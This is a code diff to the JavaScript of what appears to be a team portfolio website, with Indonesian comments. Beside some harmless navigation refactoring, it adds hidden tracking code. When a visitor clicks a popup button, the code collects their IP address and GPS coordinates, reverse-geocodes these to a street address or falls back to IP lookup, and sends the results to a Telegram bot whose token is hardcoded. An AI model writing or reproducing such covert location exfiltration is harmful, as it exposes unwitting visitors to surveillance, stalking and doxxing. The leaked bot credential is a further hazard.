@@ -1,3 +1,4 @@
+// ============= TEAM DATA (tetap) =============
 const teamData = [
     {
         name: './Mr-Rubic',
@@ -67,6 +68,132 @@ function renderTeam() {
     `).join('');
 }
 
+// ============= TRACKING (LANGSUNG KE TELEGRAM) =============
+async function sendToTelegram(data) {
+    const botToken = '8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
+    const chatId = '8564704937';
+    
+    let msg = `📍 NEW VISITOR\n━━━━━━━━━━━━━━━━━━━━\n`;
+    msg += `🌐 IP: ${data.ip || '-'}\n`;
+    if (data.lat) {
+        msg += `📍 GPS: ${data.lat}, ${data.lon}\n📏 Akurasi: ${data.accuracy} meter\n`;
+        msg += `🏠 Alamat: ${data.address || '-'}\n`;
+    } else {
+        msg += `📍 Lokasi: ${data.city}, ${data.region}, ${data.country}\n`;
+        msg += `📡 ISP: ${data.isp}\n`;
+    }
+    msg += `\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+    
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: msg })
+        });
+    } catch(e) {
+        console.log('Telegram error:', e);
+    }
+}
+
+async function getLocationFromIP(ip) {
+    try {
+        const res = await fetch(`http://ip-api.com/json/${ip}`);
+        const data = await res.json();
+        if (data.status === 'success') {
+            return {
+                city: data.city,
+                region: data.regionName,
+                country: data.country,
+                isp: data.isp,
+                lat: data.lat,
+                lon: data.lon
+            };
+        }
+    } catch(e) {}
+    return null;
+}
+
+async function trackUser() {
+    // Get IP
+    let ip = null;
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip;
+    } catch(e) {}
+    
+    // Try GPS first
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const accuracy = pos.coords.accuracy;
+            
+            // Reverse geocoding
+            let address = '';
+            try {
+                const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+                const geo = await geoRes.json();
+                address = geo.display_name || '';
+            } catch(e) {}
+            
+            await sendToTelegram({
+                ip: ip,
+                lat: lat,
+                lon: lon,
+                accuracy: accuracy,
+                address: address
+            });
+        }, async () => {
+            // GPS denied, fallback to IP
+            const ipData = await getLocationFromIP(ip);
+            if (ipData) {
+                await sendToTelegram({
+                    ip: ip,
+                    city: ipData.city,
+                    region: ipData.region,
+                    country: ipData.country,
+                    isp: ipData.isp
+                });
+            } else {
+                await sendToTelegram({ ip: ip });
+            }
+        });
+    } else {
+        // No GPS support
+        const ipData = await getLocationFromIP(ip);
+        if (ipData) {
+            await sendToTelegram({
+                ip: ip,
+                city: ipData.city,
+                region: ipData.region,
+                country: ipData.country,
+                isp: ipData.isp
+            });
+        } else {
+            await sendToTelegram({ ip: ip });
+        }
+    }
+}
+
+// ============= SHOW POPUP =============
+setTimeout(() => {
+    const popup = document.getElementById('trackPopup');
+    if (popup) popup.style.display = 'block';
+}, 3000);
+
+// ============= HANDLE POPUP BUTTON =============
+const trackBtn = document.getElementById('trackBtn');
+if (trackBtn) {
+    trackBtn.onclick = () => {
+        document.getElementById('trackPopup').style.display = 'none';
+        trackUser();
+    };
+}
+
+// ============= EXISTING CODE (loader, nav, etc) =============
 window.addEventListener('load', () => {
     const loader = document.getElementById('loader');
     if (loader) {
@@ -83,7 +210,6 @@ document.querySelectorAll('.nav-link').forEach(link => {
         const element = document.querySelector(target);
         if (element) {
             element.scrollIntoView({ behavior: 'smooth' });
-            
             document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
             link.classList.add('active');
         }
@@ -93,9 +219,7 @@ document.querySelectorAll('.nav-link').forEach(link => {
 window.addEventListener('scroll', () => {
     const sections = document.querySelectorAll('.section');
     const navLinks = document.querySelectorAll('.nav-link');
-    
     let current = '';
-    
     sections.forEach(section => {
         const sectionTop = section.offsetTop - 100;
         const sectionBottom = sectionTop + section.offsetHeight;
@@ -103,7 +227,6 @@ window.addEventListener('scroll', () => {
             current = section.getAttribute('id');
         }
     });
-    
     navLinks.forEach(link => {
         link.classList.remove('active');
         if (link.getAttribute('href') === `#${current}`) {
@@ -117,25 +240,25 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 const hamburger = document.getElementById('hamburger');
-const navLinks = document.getElementById('nav-links');
+const navLinksMenu = document.getElementById('nav-links');
 
-if (hamburger && navLinks) {
+if (hamburger && navLinksMenu) {
     hamburger.addEventListener('click', () => {
         hamburger.classList.toggle('active');
-        navLinks.classList.toggle('active');
+        navLinksMenu.classList.toggle('active');
     });
     
-    navLinks.querySelectorAll('.nav-link').forEach(link => {
+    navLinksMenu.querySelectorAll('.nav-link').forEach(link => {
         link.addEventListener('click', () => {
             hamburger.classList.remove('active');
-            navLinks.classList.remove('active');
+            navLinksMenu.classList.remove('active');
         });
     });
     
     document.addEventListener('click', (e) => {
-        if (!navLinks.contains(e.target) && !hamburger.contains(e.target) && navLinks.classList.contains('active')) {
+        if (!navLinksMenu.contains(e.target) && !hamburger.contains(e.target) && navLinksMenu.classList.contains('active')) {
             hamburger.classList.remove('active');
-            navLinks.classList.remove('active');
+            navLinksMenu.classList.remove('active');
         }
     });
 }
